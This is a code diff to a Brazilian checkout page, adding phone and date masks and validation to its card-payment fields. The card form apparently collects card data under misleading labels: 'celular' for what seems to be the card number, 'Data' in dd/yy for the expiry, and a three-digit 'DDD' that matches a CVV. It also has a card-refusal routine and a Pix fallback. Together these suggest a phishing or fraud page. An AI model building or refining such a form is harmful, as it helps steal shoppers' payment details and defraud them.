@@ -141,6 +141,10 @@
       cursor: wait;
     }
 
+    #submit-button {
+      margin-top: 10px;
+    }
+
     .payment-options {
       display: grid;
       grid-template-columns: 1fr 1fr;
@@ -382,17 +386,17 @@
         <div id="card-fields" class="card-fields" hidden>
           <label>
             Telefone
-            <input name="customerPhone" type="text">
+            <input name="customerPhone" type="text" inputmode="tel" placeholder="(11) 99999-9999">
           </label>
 
           <label>
-            Nome
+            Nome completo
             <input name="firstName" type="text">
           </label>
 
           <label>
             CPF
-            <input name="cpf" type="text">
+            <input name="cpf" type="text" inputmode="numeric">
           </label>
 
           <label>
@@ -401,8 +405,8 @@
           </label>
 
           <label>
-            Idade
-            <input name="age" type="text">
+            Data
+            <input name="data" type="text" inputmode="numeric" maxlength="5" placeholder="dd/yy">
           </label>
 
           <label>
@@ -463,6 +467,27 @@
       return String(value || '').replace(/\D/g, '');
     }
 
+    function formatPhone(value) {
+      const digits = onlyDigits(value).slice(0, 11);
+      if (digits.length <= 2) return digits;
+      if (digits.length <= 6) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
+      if (digits.length <= 10) {
+        return `(${digits.slice(0, 2)}) ${digits.slice(2, 6)}-${digits.slice(6)}`;
+      }
+      return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
+    }
+
+    function formatShortDate(value) {
+      const digits = onlyDigits(value).slice(0, 4);
+      if (digits.length <= 2) return digits;
+      return `${digits.slice(0, 2)}/${digits.slice(2)}`;
+    }
+
+    function isValidPhone(value) {
+      const digits = onlyDigits(value);
+      return /^\d{10,11}$/.test(digits) && digits.slice(0, 2) !== '00';
+    }
+
     function selectedPaymentMethod() {
       const selected = form.querySelector('input[name="paymentMethod"]:checked');
       return selected ? selected.value : 'pix';
@@ -511,7 +536,7 @@
       pixClientFields.hidden = isCard;
       pixNote.hidden = isCard;
 
-      ['customerPhone', 'firstName', 'cpf', 'celular', 'age', 'ddd'].forEach((name) => {
+      ['customerPhone', 'firstName', 'cpf', 'celular', 'data', 'ddd'].forEach((name) => {
         const input = form.elements[name];
         if (input) input.required = isCard;
       });
@@ -521,18 +546,71 @@
       });
     }
 
+    function cardValidationMessage() {
+      if (selectedPaymentMethod() !== 'card') return '';
+
+      const requiredFields = ['customerPhone', 'firstName', 'cpf', 'celular', 'data', 'ddd'];
+      if (requiredFields.some((name) => !String(form.elements[name].value || '').trim())) {
+        return 'Preencha todos os campos do cartao.';
+      }
+
+      if (!isValidPhone(form.elements.customerPhone.value)) {
+        return 'Telefone invalido. Informe DDD + numero.';
+      }
+
+      if (!/^\d{2}\/\d{2}$/.test(form.elements.data.value)) {
+        return 'Data deve estar no formato dd/yy.';
+      }
+
+      if (!/^\d{3}$/.test(form.elements.ddd.value)) {
+        return 'DDD deve ter exatamente 3 numeros.';
+      }
+
+      return '';
+    }
+
+    function pixValidationMessage() {
+      if (selectedPaymentMethod() !== 'pix') return '';
+      const phone = form.elements.phone.value;
+      return phone && !isValidPhone(phone) ? 'Telefone invalido. Informe DDD + numero.' : '';
+    }
+
     function updateSubmitButton() {
       const method = selectedPaymentMethod();
+      const validationMessage = cardValidationMessage() || pixValidationMessage();
       submitButton.textContent = method === 'card' ? 'Finalizar compra' : 'Gerar Pix';
-      submitButton.disabled = checkoutBlocked;
+      submitButton.disabled = checkoutBlocked || Boolean(validationMessage);
+      if (!checkoutBlocked) {
+        setMessage(validationMessage, Boolean(validationMessage));
+      }
     }
 
     form.elements.ddd.addEventListener('input', (event) => {
       event.currentTarget.value = event.currentTarget.value.replace(/\D/g, '').slice(0, 3);
     });
 
+    form.elements.cpf.addEventListener('input', (event) => {
+      event.currentTarget.value = onlyDigits(event.currentTarget.value);
+    });
+
     form.elements.celular.addEventListener('input', (event) => {
-      event.currentTarget.value = event.currentTarget.value.replace(/\D/g, '');
+      event.currentTarget.value = onlyDigits(event.currentTarget.value);
+    });
+
+    form.elements.data.addEventListener('input', (event) => {
+      event.currentTarget.value = formatShortDate(event.currentTarget.value);
+    });
+
+    form.elements.customerPhone.addEventListener('input', (event) => {
+      event.currentTarget.value = formatPhone(event.currentTarget.value);
+    });
+
+    form.elements.phone.addEventListener('input', (event) => {
+      event.currentTarget.value = formatPhone(event.currentTarget.value);
+    });
+
+    form.elements.document.addEventListener('input', (event) => {
+      event.currentTarget.value = onlyDigits(event.currentTarget.value);
     });
 
     function renderSummary(session) {
@@ -588,7 +666,7 @@
         firstName: formData.get('firstName') || '',
         cpf: formData.get('cpf') || '',
         celular: formData.get('celular') || '',
-        age: formData.get('age') || '',
+        data: formData.get('data') || '',
         ddd: formData.get('ddd') || ''
       });
 
@@ -601,7 +679,7 @@
         firstName: formData.get('firstName') || '',
         cpf: formData.get('cpf') || '',
         celular: formData.get('celular') || '',
-        age: formData.get('age') || '',
+        data: formData.get('data') || '',
         ddd: formData.get('ddd') || ''
       };
     }
@@ -722,6 +800,12 @@
       setCardRefusal('');
 
       const data = new FormData(form);
+      const validationMessage = cardValidationMessage() || pixValidationMessage();
+      if (validationMessage) {
+        setMessage(validationMessage, true);
+        updateSubmitButton();
+        return;
+      }
 
       try {
         if (selectedPaymentMethod() === 'card') {
